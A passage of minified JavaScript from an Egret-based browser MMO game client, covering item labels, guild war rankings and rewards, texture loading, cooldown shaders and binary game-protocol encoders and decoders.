eui.Label,e._nameTxt.stroke=1,e._nameTxt.strokeColor=0,e._nameTxt.size=14,e._nameTxt.y=-25,e._nameTxt.width=120,e._nameTxt.x=-60,e._nameTxt.textAlign=egret.HorizontalAlign.CENTER,e.addChild(e._nameTxt),e}return __extends(e,t),e.prototype.setData=function(t,e){if(t.type){if(500007==t.id)this._nameTxt.text=""+t.count;else{var i=n.GlobalConfig.ItemConfig[t.id].name;t.count>1?this._nameTxt.text=t.count+i:this._nameTxt.text=i}this._nameTxt.textColor=o.ItemUtil.getQualityColor(e||0)}else t.id==s.MoneyConst.gold?(this._nameTxt.text=""+t.count,this._nameTxt.textColor=a.QUALITY_COLOR[0]):t.id==s.MoneyConst.yuanbao&&(this._nameTxt.text=gettext("{0}元宝",t.count),this._nameTxt.textColor=a.QUALITY_COLOR[5])},e}(egret.DisplayObjectContainer);e.CharItemName=r,window.CharItemName=r,__reflect(r.prototype,"CharItemName",[]),window.CharItemName=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CharModel=void 0;var n=i(145),o=i(30),s=i(8),a=i(4),r=i(7),l=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.parserItemData=function(t){this.itemData=new o.RewardData,this.itemData.parser(t),this.belongActorId=t.readInt(),this.overTime=t.readInt()},e.prototype.canPickup=function(){return this.overTime>=0&&r.GameServerCC.serverTime>=s.DateUtils.formatMiniDateTime(this.overTime)?!0:!this.belongActorId||this.belongActorId==a.ActorCC.actorID},e}(n.EntityModel);e.CharModel=l,window.CharModel=l,__reflect(l.prototype,"CharModel",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TransferModel=void 0;var n=i(276),o=function(t){function e(){var e=t.call(this)||this;return e.type=EntityType.Transfer,e}return __extends(e,t),Object.defineProperty(e.prototype,"avatarFileName",{get:function(){return RES_DIR_EFF+"PortalEff"},enumerable:!1,configurable:!0}),e}(n.NpcModel);e.TransferModel=o,window.TransferModel=o,__reflect(o.prototype,"TransferModel",[]),window.TransferModel=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BattleRankVo=void 0;var n=function(){function t(){}return t.prototype.parse=function(t){this.rank=t.readShort(),this.camp=t.readShort(),this.roleName=t.readString(),this.unionName=t.readString(),this.score=t.readInt()},t}();e.BattleRankVo=n,window.BattleRankVo=n,__reflect(n.prototype,"BattleRankVo",[]),window.BattleRankVo=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MonsterSpeak=e.SpeakType=void 0;var n,o=i(14),s=i(20),a=i(0),r=i(37);!function(t){t[t.appear=1]="appear",t[t.hit=2]="hit",t[t.die=3]="die"}(n=e.SpeakType||(e.SpeakType={})),window.SpeakType=n;var l=function(t){function e(){var e=t.call(this)||this;return e.speakDic={},observe(e,function(t){var i=t.handle,o=t.hp;if(40001==s.GameMap.fubenID){var a=r.EntityManager.ins().getEntityByHandle(i);a&&a.data.type!=EntityType.Role&&e.trigger(a.infoModel.configID,o>0?n.hit:n.die)}},Ts.entityHpChange),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.clear=function(){this.speakDic={}},e.prototype.trigger=function(t,e){if((!this.speakDic[t]||!this.speakDic[t][e])&&a.GlobalConfig.MonsterSpeakConfig){var i=a.GlobalConfig.MonsterSpeakConfig[t];i&&i[e]&&(this.postMonsterSpeak(i[e].speak),this.speakDic[t]=this.speakDic[t]||{},this.speakDic[t][e]=1)}},e.prototype.postMonsterSpeak=function(t){return t},__decorate([post()],e.prototype,"postMonsterSpeak",null),e}(o.BaseSystem);e.MonsterSpeak=l,window.MonsterSpeak=l,__reflect(l.prototype,"MonsterSpeak",[]),Systemap.MonsterSpeak=function(){return l.ins()},window.MonsterSpeak=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SelectInfoData=e.GuildFlag=e.PointRewarddInfo=e.WarRankInfo=e.WinGuildInfo=e.MyRankGuildInfo=e.RankGuildInfo=e.GuildRedRobInfo=e.GuildWarModel=void 0;var n=i(30),o=i(0),s=i(4),a=i(173),r=i(20),l=i(28),h=i(2),u=i(107),p=i(7),d=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.guildPoint=0,e.ownPoint=0,e.gongXun=0,e.rewardDay=1,e.remainYB=-1,e.robYbNum=0,e.guildRankList=[],e.killName="",e.killGuild="",e.cityOwn=gettext("虚位以待"),e.myRankList=[],e.weixieList=[],e.canPlayList=[],e.flagStatu=0,e.endTime=0,e.flagName="",e.flagAcId=0,e.flagGuild="",e.canClick=!0,e._canSendReward=!1,e.rewardIndex=0,e.sendList=[],e.sendNumList=[],e.rewardFlag=0,e.winGuildInfo=new m,e.guildWarNumDaXie=[gettext("日"),gettext("一"),gettext("二"),gettext("三"),gettext("四"),gettext("五"),gettext("六")],e.rankList=[],e._doorEndtime=0,e.attHandle=0,e.myGuildPointRank=[],e.guildHandleList=[],e.guildNum=0,e}return __extends(e,t),e.prototype.creatGuildRankReward=function(t,e){void 0===e&&(e=-1),this.rewardList=[];var i=o.GlobalConfig.GuildBattleDistributionAward[t];for(var n in i)if(!i[n].rewardFlag||this.rewardFlag==C.hf){if(Number(n)==e+1)return i[n].awardShow;var s=i[n].awardShow;for(var a in s)this.checkIsHave(s[a])}return this.rewardList},e.prototype.creatGuildRewardList=function(){if(this.configList)return this.configList;this.configList=[];var t=o.GlobalConfig.GuildBattleDistributionAward;for(var e in t)-1==this.configList.lastIndexOf(t[e][1].rank)&&this.configList.push(t[e][1].rank);return this.configList},e.prototype.checkIsHave=function(t){for(var e=!1,i=this.rewardList.length,n=0;i>n;n++){var o=this.rewardList[n];o.id==t.id&&o.type==t.type&&(e=!0,this.rewardList[n].count+=t.count)}e||this.rewardList.push(t)},e.prototype.getRedbagInfo=function(t){this.remainYB=t.readInt(),this.canSend=t.readBoolean(),this.canRod=t.readBoolean(),this.sendYbNum=t.readInt(),this.maxRedNum=t.readInt(),this.remainRedNum=t.readInt();var e=t.readInt();this.rebList=[];for(var i,n=0;e>n;n++)i=new c,i.parse(t),s.ActorCC.actorID==i.acId&&(this.robYbNum=i.robNum),this.rebList.push(i)},e.prototype.isHaveRedBag=function(){return this.canSend||this.canRod},e.prototype.checkinAppoint=function(t,e){if(void 0===t&&(t=0),void 0===e&&(e=!1),!a.GuildWar.ins().getModel().isWatStart||0==r.GameMap.fubenID||0==l.Guild.ins().guildID)return!1;var i=o.GlobalConfig.GuildBattleLevel;for(var n in i)if(i[n].fbId==r.GameMap.fubenID)return 0==t?!0:e&&i[n].id>=t?!0:i[n].id==t?!0:!1;return!1},e.prototype.decodeGuildRankInfo=function(t){this.lastGuildName=t.readString();var e=(t.readByte(),t.readInt());this.guildRankList=[];for(var i,n=0;e>n;n++)i=new f,i.parse(t),this.guildRankList.push(i);a.GuildWar.ins().postRankInfo()},e.prototype.getNextMapName=function(t){void 0===t&&(t=1);var e=(r.GameMap.fubenID,o.GlobalConfig.GuildBattleLevel),i=1;for(var n in e)t==e[n].id&&(i=t);return e[i].name},e.prototype.getIntoNextMapGongxun=function(){var t=r.GameMap.fubenID,e=o.GlobalConfig.GuildBattleLevel,i=1;for(var n in e)if(t==e[n].fbId){if(!(e[n].id<4))return 0;i=e[n].id+1}return e[i].feats},e.prototype.getMapLevelInfo=function(){var t=r.GameMap.fubenID,e=o.GlobalConfig.GuildBattleLevel,i=1;for(var n in e)t==e[n].fbId&&(i=e[n].id);return e[i]},e.prototype.decodeMyGuildRankInfo=function(t){var e=t.readInt();this.myRankList=[];for(var i,n=0;e>n;n++)i=new g,i.parse(t),this.myRankList.push(i);a.GuildWar.ins().postMyRankChange()},e.prototype.changeWeiXieList=function(t,e,i){if(void 0===e&&(e=!0),void 0===i&&(i=""),s.ActorCC.handle!=t){var n=this.checkListElements(t,this.weixieList);e?-1==n&&(this.weixieList.push(t),h.TipsCT.ins().showTips("|C:0xf3311e&T:"+i+gettext(" 正在攻击你|"))):-1!=n&&this.weixieList.splice(n,1),a.GuildWar.ins().postWeixieChange(0)}},e.prototype.changecanPlayList=function(t,e){if(void 0===e&&(e=!0),s.ActorCC.handle!=t){var i=this.checkListElements(t,this.canPlayList);e?-1==i&&this.canPlayList.push(t):-1!=i&&this.canPlayList.splice(i,1),a.GuildWar.ins().postCanplayChange()}},e.prototype.decodeGulidWarResult=function(t){},e.prototype.checkListElements=function(t,e){if(e.length<=0)return-1;for(var i=0;i<e.length;i++)if(e[i]==t)return i;return-1},e.prototype.getRewardByPoint=function(t){var e=[];if(!this.dataList){this.dataList=[];var i=o.GlobalConfig.GuildBattlePersonalAward;for(var s in i)this.dataList.push(i[s])}for(var a=this.dataList.length,r=0;a>r;r++)t>=this.dataList[r].integral&&(e=e.concat(n.RewardData.objectsToRewardDatas(this.dataList[r].award)));return e},e.prototype.getMyPointReward=function(){var t,e=o.GlobalConfig.GuildBattlePersonalAward;for(var i in e)if(t=e[i],t.id==this.pointInfo.id)return t;return null},e.prototype.getMaxReward=function(){var t,e,i=o.GlobalConfig.GuildBattlePersonalAward,n=0;for(var s in i)t=i[s],t.integral>n&&(n=t.integral,e=t);return e},Object.defineProperty(e.prototype,"clickTime",{get:function(){return this._clickTime},set:function(t){this.canClick=!1,this._clickTime=t,Timer.stop(this.endTimeChangeStatu,this),Timer.start(1e3,this._clickTime,this.endTimeChangeStatu,this)},enumerable:!1,configurable:!0}),e.prototype.endTimeChangeStatu=function(){--this._clickTime,this._clickTime<=0&&(this.canClick=!0,Timer.stop(this.endTimeChangeStatu,this))},Object.defineProperty(e.prototype,"canSendReward",{get:function(){return l.Guild.ins().myOffice==u.GuildOffice.GUILD_BANGZHU&&this._canSendReward},set:function(t){this._canSendReward=t},enumerable:!1,configurable:!0}),e.prototype.getCanSendNumByRank=function(t){void 0===t&&(t=-1);var e=o.GlobalConfig.GuildBattleDistributionAward[this.guildWarRank],i=0;for(var n in e)if(!e[n].rewardFlag||this.rewardFlag==C.hf){if(n==t+1+"")return e[n].count;++i}return i},e.prototype.checkISSendAll=function(){for(var t=this.getCanSendNumByRank(),e=0;t>e;e++){var i=this.getCanSendNumByRank(e);if(!this.sendList[e])return h.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:|请先选择需要分配奖励的成员")),!1;for(var n=0,o=0;o<this.sendNumList[e].length;o++)n+=this.sendNumList[e][o];if(i>n)return h.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:|请先选择需要分配奖励的成员")),!1;for(var o=0;o<this.sendList[e].length;o++)if(!l.Guild.ins().checkIsInGuild(this.sendList[e][o].roleID))return h.TipsCT.ins().showTips("|C:0xf3311e&T:|"+this.sendList[e][o].name+gettext(" 已退出公会")),!1}return!0},Object.defineProperty(e.prototype,"acEndTime",{get:function(){return this._acEndTime},set:function(t){this._acEndTime=t,this._acEndTime>0&&(Timer.stop(this.reduceTime,this),Timer.start(1e3,t,this.reduceTime,this))},enumerable:!1,configurable:!0}),e.prototype.reduceTime=function(){--this._acEndTime,this._acEndTime<=0&&Timer.stop(this.reduceTime,this)},e.prototype.setOpenDesc=function(){if(0==this.startTime)return"";var t=new Date(1e3*(this.startTime+1)),e=gettext("{0}月{1}号(周{2})",t.getMonth()+1,t.getDate(),this.guildWarNumDaXie[t.getDay()])+gettext("{0}:{1}开启沙城争霸",t.getHours(),t.getMinutes());return e},e.prototype.getCdByType=function(t){if(0==r.GameMap.fubenID)return 0;var e=o.GlobalConfig.GuildBattleLevel;for(var i in e)if(e[i].fbId==r.GameMap.fubenID&&(1==t||3==t))return e[i].switchSceneCd;return 0},e.prototype.getIsShowGuildWarBtn=function(){if(0==this.startTime||o.GlobalConfig.GuildBattleConst.openLevel>s.ActorCC.level)return 0;var t=new Date(1e3*this.startTime),e=new Date(p.GameServerCC.serverTime);return t.getDate()==e.getDate()&&(e.getHours()<20||20==e.getHours()&&e.getMinutes()<=15)||this.isWatStart?1:0},e.prototype.rankListChange=function(t){var e=t.readInt();this.rankList=[];for(var i,n=0;e>n;n++)i=new v,i.parse(t),this.rankList.push(i);a.GuildWar.ins().postRankListChange()},e.prototype.decodePointRewardInfo=function(t){this.pointInfo||(this.pointInfo=new y),this.pointInfo.parse(t),a.GuildWar.ins().postPointRewardChange()},e.prototype.getSelectDataByIndex=function(t){var e,i,n=[];if(this.sendList&&this.sendList[t]&&this.sendList[t].length>0){e=this.sendList[t],i=this.sendNumList[t];for(var o=void 0,s=0;s<e.length;s++)o=new T,o.data=e[s],o.num=i[s],n.push(o)}return n},e.prototype.getMyPointRankReward=function(t){var e=o.GlobalConfig.GuildBattlePersonalRankAward;for(var i in e)if(e[i].rank==t)return e[i].award;return[]},e.prototype.doEndDoorTime=function(t){this._doorEndtime=t,Timer.stop(this.timeDo,this),Timer.start(1e3,this._doorEndtime,this.timeDo,this)},e.prototype.timeDo=function(){--this._doorEndtime,this._doorEndtime<=0&&(this._doorEndtime=0,Timer.stop(this.timeDo,this))},Object.defineProperty(e.prototype,"doorEndtime",{get:function(){return this._doorEndtime},enumerable:!1,configurable:!0}),e.prototype.getMyGuildPointRank=function(){var t,e,i=l.Guild.ins().getGuildMembers(0),n=i.length;this.myGuildPointRank=[];for(var o=0;n>o;o++)t=i[o],e=new T,e.data=t,e.num=this.getPointByAcId(t.roleID),this.myGuildPointRank.push(e);return this.myGuildPointRank.sort(this.sort),this.myGuildPointRank},e.prototype.getPointByAcId=function(t){for(var e=this.myRankList.length,i=0;e>i;i++)if(this.myRankList[i].roleID==t)return this.myRankList[i].point;return 0},e.prototype.sort=function(t,e){var i=t.num,n=e.num;return i>n?-1:n>i?1:0},e.prototype.setMyGuildNum=function(t,e){void 0===e&&(e=!0);var i=this.checkListElements(t,this.guildHandleList);e?-1==i&&this.guildHandleList.push(t):i>-1&&this.guildHandleList.splice(i,1),this.guildNum=this.guildHandleList.length,a.GuildWar.ins().postGuildNumChange()},e.prototype.clearGuildWarList=function(){this.checkinAppoint()&&(this.weixieList=[],this.canPlayList=[],this.attHandle=0,this.guildHandleList=[])},e}(egret.HashObject);e.GuildWarModel=d,window.GuildWarModel=d,__reflect(d.prototype,"GuildWarModel",[]);var c=function(){function t(){}return t.prototype.parse=function(t){this.robNum=t.readInt(),this.robName=t.readString(),this.acId=t.readInt()},t}();e.GuildRedRobInfo=c,window.GuildRedRobInfo=c,__reflect(c.prototype,"GuildRedRobInfo",[]);var f=function(){function t(){}return t.prototype.parse=function(t){this.guildName=t.readString(),this.ownName=t.readString(),this.guildPoint=t.readInt()},t}();e.RankGuildInfo=f,window.RankGuildInfo=f,__reflect(f.prototype,"RankGuildInfo",[]);
var g=function(){function t(){}return t.prototype.parse=function(t){this.roleID=t.readInt(),this.myName=t.readString(),this.mapName=t.readString(),this.point=t.readInt(),this.attr=t.readInt(),this.office=t.readInt(),this.job=t.readInt(),this.sex=t.readInt()},t}();e.MyRankGuildInfo=g,window.MyRankGuildInfo=g,__reflect(g.prototype,"MyRankGuildInfo",[]);var m=function(){function t(){this.guildId=0,this.guildName="",this.guildOwnName="",this.guildOwnId=0,this.guildOwnJob=0,this.guildOwnSex=0,this.clothID=0,this.wapenId=0,this.wingOpen=0,this.winId=0}return t.prototype.parse=function(t){this.guildId=t.readInt(),this.guildName=t.readString(),this.guildOwnName=t.readString(),this.guildOwnId=t.readInt(),this.guildOwnJob=t.readByte(),this.guildOwnSex=t.readByte(),this.clothID=t.readInt(),this.wapenId=t.readInt(),this.wingOpen=t.readInt(),this.winId=t.readInt()},t}();e.WinGuildInfo=m,window.WinGuildInfo=m,__reflect(m.prototype,"WinGuildInfo",[]);var v=function(){function t(){}return t.prototype.parse=function(t){this.name=t.readString(),this.point=t.readInt()},t}();e.WarRankInfo=v,window.WarRankInfo=v,__reflect(v.prototype,"WarRankInfo",[]);var y=function(){function t(){}return t.prototype.parse=function(t){this.isCan=t.readBoolean(),this.id=t.readInt(),this.point=t.readInt()},t}();e.PointRewarddInfo=y,window.PointRewarddInfo=y,__reflect(y.prototype,"PointRewarddInfo",[]);var C;!function(t){t[t.act=0]="act",t[t.hf=1]="hf",t[t.kf=2]="kf"}(C=e.GuildFlag||(e.GuildFlag={})),window.GuildFlag=C;var T=function(){function t(){}return t}();e.SelectInfoData=T,window.SelectInfoData=T,__reflect(T.prototype,"SelectInfoData",[]),window.SelectInfoData=T},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EffectType=void 0;var n;!function(t){t[t.Targer=0]="Targer",t[t.Self=1]="Self",t[t.Ballistic=2]="Ballistic",t[t.AnyAngle=3]="AnyAngle",t[t.Sustain=4]="Sustain",t[t.Range=5]="Range",t[t.Sector=6]="Sector",t[t.WarSoul=7]="WarSoul"}(n=e.EffectType||(e.EffectType={})),window.EffectType=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PetModel=void 0;var n=i(145),o=function(t){function e(){var e=t.call(this)||this;return e.type=EntityType.Pet,e}return __extends(e,t),e}(n.EntityModel);e.PetModel=o,window.PetModel=o,__reflect(o.prototype,"PetModel",[]),window.PetModel=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.JingMaiData=void 0;var n=i(19),o=i(0),s=i(4),a=i(6),r=function(){function t(){}return t.prototype.parser=function(t){this.level=t.readInt(),this.stage=t.readInt()},t.prototype.jingMaiCanUp=function(){o.GlobalConfig.JingMaiStageConfig[this.stage];if(this.level>=o.GlobalConfig.JingMaiCommonConfig.levelMax)return!1;if(this.level%10==0&&this.level/10>this.stage&&0!=this.level){for(var t=o.GlobalConfig.JingMaiStageConfig[this.stage],e=0;e<t.cost.length;e++)if(!n.GlobalFun.checkCost(t.cost[e].count,t.cost[e].id,"",!1))return!1;return!0}var i=o.GlobalConfig.JingMaiLevelConfig[this.level],r=a.BagCT.ins().getBagGoodsCountById(a.BagCT.BAG_TYPE_OTHTER,i.itemId);return r>=i.count&&i.gold<=s.ActorCC.gold},t}();e.JingMaiData=r,window.JingMaiData=r,__reflect(r.prototype,"JingMaiData",[]),window.JingMaiData=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WingsData=void 0;var n=i(222),o=function(){function t(){this.lv=0,this.exp=0,this.openStatus=0,this.clearTime=0,this.aptitudeDan=0,this.flyUpDan=0,this.appLv=-1}return t.prototype.getEquipByIndex=function(t){return this.equipdata[t]},Object.defineProperty(t.prototype,"equipsLen",{get:function(){return this.equipdata.length},enumerable:!1,configurable:!0}),t.prototype.parser=function(t){this.parserBoost(t),this.parserOpenStatus(t),this.parserClearTime(t),this.parserDans(t),this.appLv=t.readInt()},t.prototype.parserBoost=function(t){this.lv=t.readInt(),this.exp=t.readUnsignedInt()},t.prototype.parserOpenStatus=function(t){this.openStatus=t.readInt()},t.prototype.parserClearTime=function(t){this.clearTime=t.readUnsignedInt()},t.prototype.parserDans=function(t){this.aptitudeDan=t.readShort(),this.flyUpDan=t.readShort()},t.prototype.parserWingEqupip=function(t){this.equipdata=[];for(var e,i=0;4>i;i++)e=new n.EquipsData,e.parser(t),this.equipdata.push(e)},t.prototype.getImgSource=function(){return""},t}();e.WingsData=o,window.WingsData=o,__reflect(o.prototype,"WingsData",[]),window.WingsData=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PackETC1KTXProcessor=void 0;var n=function(){function t(){}return t.prototype.onLoadStart=function(t,e){var i=this;return t.load(e,"bin").then(function(n){if(!n)return null;var o=n,s=new Uint32Array(o),a=(s[0],s[1]),r=s[2],l=12,h=new Uint8Array(o),u=new Uint8Array(h.slice(l,l+a));l+=a;var p=r>0?new Uint8Array(h.slice(l,l+r)):null,d=null;if(u){var c=new ArrayBuffer(u.byteLength),f=new Uint8Array(c);f.set(u),d=i.createCompressedTexture(t,e,c)}var g=null;if(p){var c=new ArrayBuffer(p.byteLength),f=new Uint8Array(c);f.set(p),g=i.createCompressedTexture(t,e,c)}return d&&d.$bitmapData&&g&&g.$bitmapData&&(d.$bitmapData.etcAlphaMask=g.$bitmapData),t.save(e,d),d},function(i){throw t.remove(e),i})},t.prototype.createCompressedTexture=function(t,e,i){if(!i)return null;var n=new egret.KTXContainer(i,1);if(n.isInvalid)return null;var o=new egret.BitmapData(i);o.debugCompressedTextureURL=e.root+e.url,o.format="ktx",n.uploadLevels(o,!1);var s=new egret.Texture;s._setBitmapData(o);var a=t.resourceConfig.getResource(e.name);if(a&&a.scale9grid){var r=a.scale9grid.split(",");s.scale9Grid=new egret.Rectangle(parseInt(r[0]),parseInt(r[1]),parseInt(r[2]),parseInt(r[3]))}return s},t.prototype.onRemoveStart=function(t,e){var i=t.get(e);if(i){if(i.$bitmapData){var n=i.$bitmapData.etcAlphaMask;n&&(n.$dispose(),i.$bitmapData.etcAlphaMask=n=null)}i.dispose()}},t}();e.PackETC1KTXProcessor=n,window.PackETC1KTXProcessor=n,__reflect(n.prototype,"PackETC1KTXProcessor",["RES.processor.Processor"])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.baseVertex=void 0,e.baseVertex="\n\nattribute vec2 aVertexPosition;\nattribute vec2 aTextureCoord;\nattribute vec2 aColor;\n\nuniform vec2 projectionVector;\n\nvarying vec2 vTextureCoord;\nvarying vec4 vColor;\n\nconst vec2 center = vec2(-1.0, 1.0);\n\nvoid main(void) {\n	gl_Position = vec4( (aVertexPosition / projectionVector) + center , 0.0, 1.0);\n	vTextureCoord = aTextureCoord;\n	vColor = vec4(aColor.x, aColor.x, aColor.x, aColor.x);\n}\n\n"},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.cdshader_mc_rect=e.cdshader_mc=e.cdshader=void 0,e.cdshader="\n\nprecision mediump float;\n\nuniform float time;\nuniform float PI;\nuniform sampler2D uSampler;\nvarying vec2 vTextureCoord;\n\nvoid main() {\n	vec4 mask_FragColor = texture2D(uSampler, vTextureCoord);\n\n	//以正中间为中心，所以将uv范围映射到(-0.5, 0.5)\n	vec2 uv = vTextureCoord - vec2(0.5, 0.5);\n	//-1用于控制方向\n	float radian = atan(uv.x, uv.y) * -1. + PI;\n\n	// float radian2 = mod(time * 2.* PI, 0.);\n	float radian2 = time * 2.* PI;\n	float v = step(radian, radian2);\n\n	gl_FragColor = mask_FragColor * sign(v);\n	// gl_FragColor = vec4(v);\n}\n",e.cdshader_mc="\n\nprecision mediump float;\n\nuniform float time;\nuniform float PI;\nuniform float w;\nuniform float h;\nuniform float frameW;\nuniform sampler2D uSampler;\nvarying vec2 vTextureCoord;\n\nvoid main() {\n	vec4 mask_FragColor = texture2D(uSampler, vTextureCoord);\n	float once = 1. / w;\n	float frameIndex = vTextureCoord.x / once / frameW;\n	frameIndex = min(floor(frameIndex), w / frameW - 1.);\n	float w2 = frameW / 2.;\n	\n	//以正中间为中心，所以将uv范围映射到(-0.5, 0.5)\n	vec2 uv = vTextureCoord - vec2((frameIndex * frameW + w2) * once, 0.5);\n	\n	//-1用于控制方向\n	float radian = atan(uv.x, uv.y * h / w) * -1. + PI;\n\n	float radian2 = time * 2.* PI;\n	float v = step(radian, radian2);\n\n	gl_FragColor = mask_FragColor * sign(v);\n}\n\n",e.cdshader_mc_rect="\n\nprecision mediump float;\n\nuniform float time;\nuniform float PI;\nuniform float value;\nuniform int dir;\nuniform sampler2D uSampler;\nvarying vec2 vTextureCoord;\n\nvoid main() {\n	vec4 mask_FragColor = texture2D(uSampler, vTextureCoord);\n	float vv = dir == 1 ? vTextureCoord.x : vTextureCoord.y;\n	float v = step(1. - value, vv);\n	gl_FragColor = mask_FragColor * sign(v);\n}\n\n"},function(t,e,i){var n=function(){function t(){}return t.encode=function(t){},t.decode=function(t){var e=this,n=t.readDouble(),o=t.readDouble(),s=t.readDouble();return Promise.resolve().then(function(){return i(37)}).then(function(t){var i=t.EntityManager,a=i.ins().getEntityByHandle(n);if(a){var r=a.infoModel.getAtt(0);e.postHpChange({handle:n,hp:o,maxHp:s,oldHp:r})}}),{handle:n,hp:o,maxHp:s}},t.postHpChange=function(t){return t},t.postMyHpChange=function(t){return t},__decorate([post()],t,"postHpChange",null),__decorate([post()],t,"postMyHpChange",null),t}();window.p0_9=n,__reflect(n.prototype,"p0_9",[])},function(t,e){var i=function(){function t(){}return t.encode=function(){},t.decode=function(t){var e=t.readInt(),i=t.readByte(),n=t.readByte(),o=t.readInt();return{petLevel:e,isFight:i,state:n,nextTime:o}},t}();window.p100_2=i,__reflect(i.prototype,"p100_2",[])},function(t,e){var i=function(){function t(){}return t.encode=function(){},t.decode=function(){},t}();window.p100_3=i,__reflect(i.prototype,"p100_3",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t,e,i){var n=e.rid;void 0===i&&(i=!1),t.writeShort(n),t.writeByte(+i)},t.decode=function(t){for(var e=t.readByte(),i=[],n=0;e>n;n++){var o=t.readShort(),s=t.readByte();i[o]=s,1==s&&send(Ts.petGift,{rid:o})}return{arr:i}},t}();window.p100_4=i,__reflect(i.prototype,"p100_4",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t,e,i){var n=e.isFight;void 0===i&&(i=!1),t.writeByte(n),t.writeByte(+i)},t.decode=function(t){var e=t.readByte(),i=t.readByte();return{isFight:e,state:i}},t}();window.p100_6=i,__reflect(i.prototype,"p100_6",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t,e,i){var n=e.state;void 0===i&&(i=!1),t.writeByte(n),t.writeByte(+i)},t.decode=function(t){var e=t.readByte();return{state:e}},t}();window.p100_7=i,__reflect(i.prototype,"p100_7",[])},function(t,e){var i=function(){function t(){}return t.encode=function(){},t.decode=function(t){return t},t}();window.p101_1=i,__reflect(i.prototype,"p101_1",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t,e){var i=e.godId,n=e.b;t.writeByte(i),t.writeByte(n?1:0)},t.decode=function(t){var e=t.readByte(),i=t.readUnsignedShort(),n=t.readUnsignedShort(),o=t.readInt();return{godId:e,stage:i,star:n,power:o}},t}();window.p101_2=i,__reflect(i.prototype,"p101_2",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t,e){var i=e.godId,n=e.pos,o=e.itemId;t.writeByte(i),t.writeByte(n),t.writeInt(o)},t.decode=function(t){var e=t.readByte(),i=t.readByte(),n=t.readInt(),o=t.readInt();return{godId:e,pos:i,itemId:n,power:o}},t}();window.p101_4=i,__reflect(i.prototype,"p101_4",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t,e){var i=e.godId,n=e.pos;t.writeByte(i),t.writeByte(n)},t.decode=function(t){var e=t.readByte(),i=t.readByte(),n=t.readShort(),o=t.readInt();return{godId:e,pos:i,lv:n,power:o}},t}();window.p101_5=i,__reflect(i.prototype,"p101_5",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t,e){t.writeInt(e)},t.decode=function(t){},t}();window.p10_40=i,__reflect(i.prototype,"p10_40",[])},function(t,e){var i=function(){function t(){}return t.encode=function(){},t.decode=function(t){},t}();window.p1_4=i,__reflect(i.prototype,"p1_4",[])},function(t,e){var i=function(){function t(){}return t.encode=function(){},t.decode=function(t){return{x:t.readInt(),y:t.readInt()}},t}();window.p1_82=i,__reflect(i.prototype,"p1_82",[])},function(t,e,i){var n=function(){function t(){}return t.encode=function(t,e){var i=e.handle,n=e.tarHandle,o=e.skillID,s=e.x,a=e.y;t.writeDouble(i),t.writeDouble(n),t.writeInt(o),t.writeInt(s),t.writeInt(a),this.time=(new Date).getTime()},t.decode=function(t){var e=this,n=t.readDouble(),o=t.readInt(),s=t.readString();if(!s){for(var a=t.readDouble(),r=t.readShort(),l=[],h=0;r>h;h++)l.push(t.readDouble());var u=t.readShort(),p=t.readShort();return Promise.resolve().then(function(){return i(13)}).then(function(t){var i,r,h=t.SubRoles;(null===(r=null===(i=h.lookAtTar)||void 0===i?void 0:i.infoModel)||void 0===r?void 0:r.handle)==n&&e.myUse({error:s,handle:n,skillID:o,tarHandle:a,tarHandles:l,x:u,y:p})}),{error:s,handle:n,skillID:o,tarHandle:a,tarHandles:l,x:u,y:p}}return{error:s,handle:n,skillID:o}},t.myUse=function(t){return t},t.time=0,__decorate([post()],t,"myUse",null),t}();window.p2_1=n,__reflect(n.prototype,"p2_1",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t,e,i){var n=e.pos,o=e.itemId;void 0===i&&(i=!1),t.writeByte(n),t.writeInt(o),t.writeByte(+i)},t.decode=function(t){for(var e=t.readByte(),i=[],n=0;e>n;n++)i[t.readByte()]=t.readInt();return{item:i}},t}();window.p2_19=i,__reflect(i.prototype,"p2_19",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t){},t.decode=function(t){var e=t.readDouble(),i=t.readInt();return{handle:e,id:i}},t}();window.p2_2=i,__reflect(i.prototype,"p2_2",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t){},t.decode=function(t){var e=t.readDouble(),i=t.readInt();return{handle:e,id:i}},t}();window.p2_3=i,__reflect(i.prototype,"p2_3",[])},function(t,e){var i=function(){function t(){}return t.encode=function(){},t.decode=function(t){var e=t.readUnsignedInt();this.oldLv||this.oldLv==e||this.unlock(e,this.oldLv),this.oldLv=e;var i=t.readUnsignedInt(),n=t.readByte();return{lv:e,cd:i,reset:n}},t.unlock=function(t,e){return{lv:t,old:e}},__decorate([post()],t,"unlock",null),t}();window.p2_9=i,__reflect(i.prototype,"p2_9",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t){},t.decode=function(t){for(var e=(t.readByte(),t.readUnsignedShort()),i={},n=0;e>n;n++)i[t.readShort()]=t.readInt();return i},t}();window.p30_6=i,__reflect(i.prototype,"p30_6",[])},function(t,e,i){var n=function(){function t(){}return t.encode=function(t){},t.decode=function(t){var 